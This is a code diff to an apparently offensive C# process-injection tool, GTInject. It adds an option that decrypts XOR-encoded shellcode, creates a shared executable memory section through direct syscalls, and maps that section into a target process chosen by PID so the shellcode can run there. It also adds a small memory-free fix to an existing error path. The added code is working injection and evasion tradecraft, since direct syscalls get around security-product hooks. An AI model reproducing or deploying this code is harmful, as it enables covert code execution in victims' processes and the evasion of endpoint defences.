@@ -22,6 +22,8 @@ namespace GTInject.memoryOptions
                     return memopt201(binsrctype, binsrcpath, xorkey, pid);
                 case 300:
                     return memopt300(binsrctype, binsrcpath, xorkey, pid);
+                case 301:
+                    return memopt301(binsrctype, binsrcpath, xorkey, pid);
                 default:
                     Console.WriteLine("[-] Not a valid memory allocation option integer");
                     return (IntPtr.Zero, null);
@@ -118,6 +120,7 @@ namespace GTInject.memoryOptions
             }
             catch {
                 Console.WriteLine("[-] Failed to write using NTAPIs - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");
+                Marshal.FreeHGlobal(unmanagedPointer);
                 return (IntPtr.Zero, null);
             }
         }
@@ -193,6 +196,68 @@ namespace GTInject.memoryOptions
 
             return (baseAddress, remoteProc);
         }
+
+        private static (IntPtr, Process) memopt301(string binLocation, string bytePath, string xorkey, int ProcID)
+        {
+            /////////////////////////////////////
+            // OPTION 301 == Direct Syscalls NtCreateSection, NtMapViewOfSection, RtlCopyMemory
+            /////////////////////////////////////
+            Console.WriteLine("     Allocate memory using NTAPIs - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");
+
+            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
+
+            int len = plainBytes.Length;
+            uint bufferLength = (uint)len;
+            IntPtr sectionHandler = new IntPtr();
+            var status = Syscalls.SysclNtCreateSection(ref sectionHandler, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE), IntPtr.Zero, ref bufferLength, (uint)(MemoryProtection.ExecuteReadWrite), (uint)(SEC_COMMIT), IntPtr.Zero);
+            Console.WriteLine("     Direct Syscall to NtCreateSection NTSTATUS : " + status);
+
+            // Map the new section for the LOCAL process.
+            IntPtr localBaseAddress = new IntPtr();
+            int sizeLocal = plainBytes.Length;
+            ulong offsetSectionLocal = new ulong();
+
+            Process localProc = Process.GetCurrentProcess();
+            status = Syscalls.SysclNtMapViewOfSection(sectionHandler, localProc.Handle, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, (uint)(MemoryProtection.ReadWrite));
+            Console.WriteLine("     Direct Syscall to NtMapViewOfSection local NTSTATUS : " + status);
+            Console.WriteLine("     local base address " + localBaseAddress);
+
+            // Map the new section for the REMOTE process.
+            IntPtr remoteBaseAddress = new IntPtr();
+            int sizeRemote = plainBytes.Length;
+            ulong offsetSectionRemote = new ulong();
+
+            Process remoteProc = Process.GetProcessById(ProcID);
+
+            status = Syscalls.SysclNtMapViewOfSection(sectionHandler, remoteProc.Handle, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, (uint)(MemoryProtection.ExecuteRead));
+            Console.WriteLine("     Direct Syscall to NtMapViewOfSection remote NTSTATUS : " + status);
+
+            //RtlCopyMemory takes an IntPtr, take our Byte array into a newly allocated unmanaged pointer temporarily
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(plainBytes.Length);
+            Console.WriteLine("     created unmanaged ptr " + unmanagedPointer);
+            Marshal.Copy(plainBytes, 0, unmanagedPointer, plainBytes.Length);
+            Console.WriteLine("     marshal copied to unmgd ptr ");
+            /*            RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
+                        Console.WriteLine( "    RtlCopyMemory execd");
+                        Marshal.FreeHGlobal(unmanagedPointer);*/
+
+            try
+            {
+                RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
+                Console.WriteLine("     RtlCopyMemory execd");
+                Marshal.FreeHGlobal(unmanagedPointer);
+                Console.WriteLine("[+] Wrote to Mem using Direct Syscalls - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");
+                return (remoteBaseAddress, remoteProc);
+            }
+            catch
+            {
+                Console.WriteLine("[-] Failed to write using Direct Syscalls - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");
+                Marshal.FreeHGlobal(unmanagedPointer);
+                return (IntPtr.Zero, null);
+            }
+
+        }
+
         /////////////////////////////////////
         // Supporting functions
         /////////////////////////////////////
